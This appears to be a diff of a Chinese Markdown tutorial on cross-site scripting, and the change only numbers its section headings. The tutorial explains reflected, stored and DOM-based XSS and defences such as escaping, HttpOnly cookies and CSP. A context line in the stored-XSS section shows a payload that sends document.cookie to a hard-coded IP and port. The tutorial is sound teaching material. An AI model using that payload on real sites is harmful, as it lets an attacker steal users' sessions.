@@ -7,7 +7,7 @@ meta:
 ---
 # 跨站脚本攻击
 
-## 介绍
+## 1. 介绍
 
 > “XSS是跨站脚本攻击(Cross Site Scripting)，为不和层叠样式表(Cascading Style Sheets, CSS)的缩写混淆，故将跨站脚本攻击缩写为XSS。恶意攻击者往Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。”
 
@@ -25,9 +25,9 @@ xss攻击的核心方式是脚本。这些脚本通常是javascript脚本，从�
 
 + 控制企业数据，包括读取、篡改、添加、删除企业敏感数据的能力
 
-## 分类
+## 2. 分类
 
-### 反射型xss
+### 2.1 反射型xss
 
 `反射型xss`又被称为`非持久型xss`。当用户访问一个带有xss攻击代码的url请求的时候，向服务器发送请求，服务器接受请求后处理，并把客户端发送的xss攻击代码返回给客户端，客户端解析这段代码的时候，就有可能遭受xss攻击
 
@@ -39,7 +39,7 @@ xss攻击的核心方式是脚本。这些脚本通常是javascript脚本，从�
 
 数据流向： 浏览器 -> 后端 -> 浏览器
 
-### 存储型xss
+### 2.2 存储型xss
 
 `存储型xss`又被称为`持久化的xss`。也是最危险的xss攻击方式。一旦攻击成功，就有可能造成大规模的xss攻击，也就是我们通常所说的xss蠕虫。
 
@@ -58,7 +58,7 @@ document.write("<img src='http://192.168.59.129:10086?c=" + escape(document.cook
 
 数据流向： 浏览器 -> 后端 -> 数据库 -> 后端 -> 浏览器
 
-### DOM型xss
+### 2.3 DOM型xss
 
 我们可以通过JavaScript来操作dom树，所以，xss攻击也是能够做到这一点的。dom型xss攻击最大的危害就是改变我们网页的布局。这种类型的xss是不需要和服务器进行交互的，只发生在客户端处理阶段。比如一段xss攻击的代码是：
 
@@ -72,7 +72,7 @@ document.body.appendChild(div)
 
 数据流向： URL -> 浏览器
 
-### 对比总结
+### 2.4 对比总结
 
 | 类型 | 反射型 | 存储型 | DOM型 |
 | --- | --- | ---| ---|
@@ -81,11 +81,11 @@ document.body.appendChild(div)
 | 谁来输出 | 后端WEB应用程序 | 后端WEB应用程序 | 前端JS |
 | 输出位置 | HTTP响应中 | HTTP响应中 | 动态构建DOM节点 |
 
-## 防范措施
+## 3. 防范措施
 
 应对XSS攻击的主要手段还是编码与过滤两种，`编码`用于将特殊的符号 "<、>、&、'、""进行html转义，而`过滤`则是阻止特定的标记、属性、事件
 
-### 转义html
+### 3.1 转义html
 
 + 使用encodeURIComponent对url中的参数进行编码(反射型xss)
 
@@ -93,27 +93,27 @@ document.body.appendChild(div)
 
 + 前端接收到服务器传递过来的数据，在展示到页面前，先进行转义/过滤
 
-### HTTP-only Cookie
+### 3.2 HTTP-only Cookie
 
 `HTTP-only`禁止JavaScript读取某些敏感Cookie，攻击者完成XSS注入后也无法窃取此Cookie属性：防止脚本冒充用户提交危险操作
 
 如果某一个Cookie 选项被设置成 HttpOnly = true 的话，那此Cookie 只能通过服务器端修改，Js 是操作不了的（无法读写这个cookie）
 
-### Content-Security-Policy
+### 3.3 Content-Security-Policy
 
 在服务端使用HTTP的`Content-Security-Policy`头部来指定策略，或者在前端设置meta标答。例如下面的配置只允许加载同域下的资源
 
-### innerText/textContent
+### 3.4 innerText/textContent
 
 + 在使用 `.innerHTML、.outerHTML、document.write()` 时要特别小心，不要把不可信的数据作为 HTML 插到页面上，而应尽量使用 .textContent、.setAttribute() 等
 
 + 如果用 Vue/React 技术栈，并且不使用 `v-html/dangerouslySetInnerHTML` 功能，就在前端 render 阶段避免 `innerHTML、outerHTML` 的 XSS 隐患
 
-### 验证码
+### 3.5 验证码
 
 防止脚本冒充用户提交危险操作
 
-## 参考资料
+## 4. 参考资料
 
 [什么是XSS攻击，XSS攻击可以分为哪几类？如何防范XSS攻击？](https://github.com/YvetteLau/Step-By-Step/issues/18)
 
